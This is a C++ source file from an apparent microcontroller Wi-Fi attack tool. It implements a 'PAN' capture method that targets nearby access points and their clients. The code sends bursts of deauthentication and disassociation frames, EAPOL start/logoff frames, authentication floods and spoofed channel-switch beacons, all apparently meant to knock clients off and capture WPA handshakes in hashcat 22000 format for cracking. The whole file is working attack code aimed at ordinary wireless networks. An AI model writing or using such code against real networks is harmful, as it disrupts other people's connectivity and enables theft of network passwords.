#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

static uint8_t csaDisrupt(uint8_t apCh) {
    if (apCh <= 4) return 11;
    if (apCh >= 9) return 1;
    return (apCh <= 6) ? 13 : 1;
}

void pan(const Ctx& ctx) {
    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
    uint8_t hit = 0;
    const BeaconSlot* csaTarget = nullptr;

    for (uint8_t i = 0; i < ctx.beaconCount; i++) {
        BeaconSlot& b = ctx.beacons[i];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        if (Hc22000::hasPair(b.bssid)) continue;
        if (b.pmfCapable) { if (!csaTarget) csaTarget = &b; continue; } // handled by pmkidProbe() instead

        if (b.clientN) {
            for (uint8_t c = 0; c < b.clientN; c++) {
                if (ctx.bidirKick) {
                    WSLBypasser::sendBidirectionalKick(b.bssid, b.clients[c], ctx.deauthReason, rounds);
                    *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
                } else {
                    for (uint8_t r = 0; r < rounds; r++) {
                        ctx.sendRawMgmt(0xC0, b.bssid, b.clients[c]);
                        ctx.sendRawMgmt(0xA0, b.bssid, b.clients[c]);
                    }
                }
                if (ctx.eapolTx) {
                    WSLBypasser::sendEAPOLStart(b.bssid, b.clients[c]);
                    WSLBypasser::sendEAPOLLogoff(b.bssid, b.clients[c]);
                }
                hit++;
            }
        } else {
            for (uint8_t r = 0; r < rounds; r++) {
                ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
                ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
            }
        }
        if (!csaTarget) csaTarget = &b;
        yield();
    }

    if (!hit && ctx.authFlood) {
        for (uint8_t i = 0; i < ctx.beaconCount; i++) {
            BeaconSlot& b = ctx.beacons[i];
            if (b.channel != ctx.channel) continue;
            if (ctx.isOwnAp(b.bssid)) continue;
            if (ctx.skipPin(b.bssid)) continue;
            if (b.rssi < ctx.minRssi) continue;
            if (Hc22000::hasPair(b.bssid)) continue;
            WSLBypasser::sendAuthFlood(b.bssid, 8);
            *ctx.framesDeauth += 8;
            break;
        }
    }

    if (ctx.csaHerd && csaTarget && csaTarget->ssid[0]) {
        WSLBypasser::sendCSABeacon(csaTarget->bssid, csaTarget->ssid,
                                   csaTarget->channel, csaDisrupt(csaTarget->channel), 1);
    }
}

CAP_METHOD_REGISTER("PAN", pan, pmkidProbe, resetPmkidState)

} // namespace Methods
} // namespace Cap
